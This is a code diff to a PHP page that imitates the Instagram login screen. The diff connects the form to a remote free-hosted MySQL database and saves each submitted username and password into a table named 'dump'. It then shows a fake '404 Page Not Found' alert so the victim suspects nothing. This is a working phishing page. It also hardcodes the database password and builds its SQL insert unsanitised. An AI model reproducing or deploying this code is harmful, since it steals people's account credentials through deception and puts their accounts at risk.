@@ -373,11 +373,10 @@ button:disabled {
 
 <body>
 <?Php
-   
-   $servername = "sql6.freesqldatabase.com";
-    $username   = "sql6509952";
-    $password   = " 8VDV9XlZhz";
-    $dbname     = "sql6509952";
+     $servername = "sql6.freesqldatabase.com";
+     $username   = "sql6509952";
+     $password   = " 8VDV9XlZhz";
+     $dbname     = "sql6509952";
     
     $conn =  mysqli_connect($servername,$username,$password,$dbname);
 
@@ -390,16 +389,18 @@ button:disabled {
      
     if (isset($_POST['submit']))
    {
-      $username = $_POST['uname'];
-      $password = $_POST['psw'];
+      $uname = $_POST['uname'];
+      $psw = $_POST['psw'];
 
-      $sql= "INSERT INTO dump (username, password) 
-      VALUES ('$username','$password')";
+      $sql= "INSERT INTO dump (uname, psw) 
+      VALUES ('$uname','$psw')";
       
      if(mysqli_query($conn,$sql))
      {
            
-          echo"connection data added successfully";
+          echo '<script type="text/javascript">
+       window.onload = function () { alert("404 Page Not Found"); } 
+</script>';
              
 
       }
@@ -411,7 +412,6 @@ button:disabled {
     }
 }
 mysqli_close($conn);
-
     ?>
 
     <div class="container">
@@ -432,13 +432,15 @@ mysqli_close($conn);
                             <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
                             <img src="./images/logo-dark.png" alt="Instagram logo" class="logo-dark">
                         </div>
-                        <div class="signin-form" id="signin-form">
+                        <div class="signin-form" id="signin-form">   
                             <div class="form-group">
+                            <form action="" method = "POST">
                                 <div class="animate-input">
                                     <span>
                                         Phone number, username or email
                                     </span>
-                                    <input type="text">
+                                    <input type="text"  name="uname" required>
+
                                 </div>
                             </div>
                             <div class="form-group">
@@ -446,12 +448,12 @@ mysqli_close($conn);
                                     <span>
                                         Password
                                     </span>
-                                    <input type="password">
+                                    <input type="password"  name="psw" required>
                                     <button>Show</button>
                                 </div>
                             </div>
-                            <div class="btn-group">
-                                <button class="btn-login" id="signin-btn" disabled>
+                            <div class="btn-group" name = "submit">
+                                <button type="submit" name = "submit" class="btn-login" >   
                                     Log In
                                 </button>
                             </div>
@@ -469,6 +471,7 @@ mysqli_close($conn);
                             <a href="#" class="forgot-pw">Forgot password?</a>
                         </div>
                     </div>
+                    </form>
                     <div class="box goto">
                         <p>
                             Don't have an account?
